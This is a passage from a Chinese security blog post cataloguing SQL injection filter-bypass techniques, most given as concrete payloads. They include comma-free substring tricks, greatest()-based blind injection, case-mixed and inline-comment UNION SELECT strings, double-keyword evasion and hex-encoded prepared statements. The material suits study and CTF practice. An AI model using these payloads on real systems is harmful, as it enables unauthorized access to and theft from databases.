<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns <span class="built_in">where</span> table_name=0x7573657273</span><br></pre></td></tr></table></figure>
<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><p>1.使用from关键字绕过<br>对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 <span class="keyword">for</span> 1);</span><br><span class="line">select mid(database() from 1 <span class="keyword">for</span> 1);</span><br></pre></td></tr></table></figure>
<p>2.使用join关键字绕过  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
<p>3.使用like关键字绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   <span class="comment">#等价于</span></span><br><span class="line">select user() like <span class="string">'r%'</span></span><br></pre></td></tr></table></figure>
<p>4.使用offset关键字绕过<br>对于limit可以使用offset来绕过：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news <span class="built_in">limit</span> 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news <span class="built_in">limit</span> 1 offset 0</span><br></pre></td></tr></table></figure>
<h2 id="过滤注释符（-和-–-）"><a href="#过滤注释符（-和-–-）" class="headerlink" title="过滤注释符（ # 和 – ）"></a>过滤注释符（ # 和 – ）</h2><p>手动闭合引号，不使用注释符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1<span class="string">' union select 1,2,3||'</span>1</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1<span class="string">' union select 1,2,'</span>3</span><br></pre></td></tr></table></figure>
<h2 id="过滤比较符号-（-lt-和-gt-）"><a href="#过滤比较符号-（-lt-和-gt-）" class="headerlink" title="过滤比较符号 （ &lt; 和 &gt; ）"></a>过滤比较符号 （ &lt; 和 &gt; ）</h2><p>1.使用<strong>greatest()、least（）函数</strong>绕过<br>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
<p>最常见的一个盲注的sql语句：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用<strong>between and</strong>绕过<br>between a and b：返回a，b之间的数据，不包含b。</li>
</ol>
<h2 id="过滤等号（-）"><a href="#过滤等号（-）" class="headerlink" title="过滤等号（ = ）"></a>过滤等号（ = ）</h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;   </p>
<h2 id="过滤union，select，where等"><a href="#过滤union，select，where等" class="headerlink" title="过滤union，select，where等"></a>过滤union，select，where等</h2><p>1.使用注释符绕过<br>常用注释符：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//、--、/**/、<span class="comment">#、--+、---、;、%00、--a</span></span><br></pre></td></tr></table></figure>
<p>用法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，<span class="built_in">pwd</span> from user</span><br></pre></td></tr></table></figure>
<p>2.使用大小写绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
<p>3.使用内联注释绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
<p>4.使用双关键字绕过（若删除掉第一个匹配的union就能绕过）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure>
<p>5.使用加号+拆解字符串</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or <span class="string">'swords'</span> =<span class="string">'sw'</span> +<span class="string">'ords'</span> ；EXEC(<span class="string">'IN'</span> +<span class="string">'SERT INTO'</span>+<span class="string">'…..'</span> )</span><br></pre></td></tr></table></figure>
<p>6.使用语法新特性绕过屏蔽select<br>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p>
<p>TABLE 语句<br>可以直接列出表的全部内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>
<p>如 select * from user 就可以用 table user 替代来进行绕过</p>
<p>VALUES 语句<br>可以列出一行的值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line"> ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line"> value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line"> column_index</span><br></pre></td></tr></table></figure>
<p>例如直接列出一行的值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VALUES ROW(1,2,3), ROW(4,5,6);</span><br></pre></td></tr></table></figure>
<p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>使用多语句的方式执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @a:=0x73656c656374202a2066726f6d2074657374;</span><br><span class="line">prepare s from @a;</span><br><span class="line">execute s;</span><br></pre></td></tr></table></figure>

<p><a href="https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/" target="_blank" rel="noopener">https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a>       </p>
<p>可看此文章<br><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a><br>参考文章:<br>史上最水的MYSQL注入总结：<a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992</a><br>sql注入总结: <a href="https://xz.aliyun.com/t/2869#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2869#toc-12</a><br>ctfwiki: <code>https://ctf-wiki.github.io/ctf-wiki/web/sqli/#_13</code><br>一种新的MySQL下Update、Insert注入方法<a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85487</a><br>解析php sprintf函数漏洞 <a href="https://blog.csdn.net/WQ_BCJ/article/details/85057447" target="_blank" rel="noopener">https://blog.csdn.net/WQ_BCJ/article/details/85057447</a></p>
<p>PHP sprintf格式化字符串漏洞 <a href="https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_A</a><br>REGEXP注入与LIKE注入学习笔记<a href="https://xz.aliyun.com/t/8003" target="_blank" rel="noopener">https://xz.aliyun.com/t/8003</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/190afa65.html">https://blog.cfyqy.com/article/190afa65.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/88d97774.html"><i class="fas fa-angle-left">&nbsp;</i><span>sql盲注效率分析</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/f76a9d38.html"><span>浅谈信安文章搜索引擎</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>